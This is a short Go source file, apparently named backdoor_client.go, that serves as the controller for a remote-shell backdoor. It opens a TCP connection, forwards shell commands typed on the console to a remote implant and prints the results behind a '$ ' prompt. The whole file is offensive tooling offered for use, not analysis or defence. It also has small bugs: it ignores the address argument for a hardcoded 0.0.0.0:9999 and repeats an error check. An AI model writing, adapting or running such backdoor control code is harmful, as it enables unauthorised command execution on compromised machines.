/**
 * Created by lock
 */
package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
	"time"
)

func main() {
	if len(os.Args) != 2 {
		fmt.Println("example: go run backdoor_client.go x.x.x.x:port")
		return
	}
	conn, err := net.DialTimeout("tcp", "0.0.0.0:9999", 5*time.Second)
	if err != nil {
		fmt.Println("net dail err:", err.Error())
		return
	}
	defer conn.Close()
	go getCmdExecResult(conn)
	reader := bufio.NewReader(os.Stdin)
	for {
		cmdString, err := reader.ReadString('\n')
		isExit := strings.TrimSuffix(cmdString, "\n")
		if isExit == "exit" {
			fmt.Fprintln(os.Stdout, "bye")
			os.Exit(0)
			return
		}
		if err != nil {
			_, _ = fmt.Fprintln(os.Stderr, err)
		}
		if err != nil {
			_, _ = fmt.Fprintln(os.Stderr, err)
		}
		_, _ = conn.Write([]byte(cmdString))
	}
}

func getCmdExecResult(conn net.Conn) {
	buff := make([]byte, 1024)
	for {
		_, _ = fmt.Fprint(os.Stdout, string("$ "))
		n, err := conn.Read(buff[:])
		if err != nil {
			continue
		}
		_, _ = fmt.Fprint(os.Stdout, string(buff[:n]))
	}
}
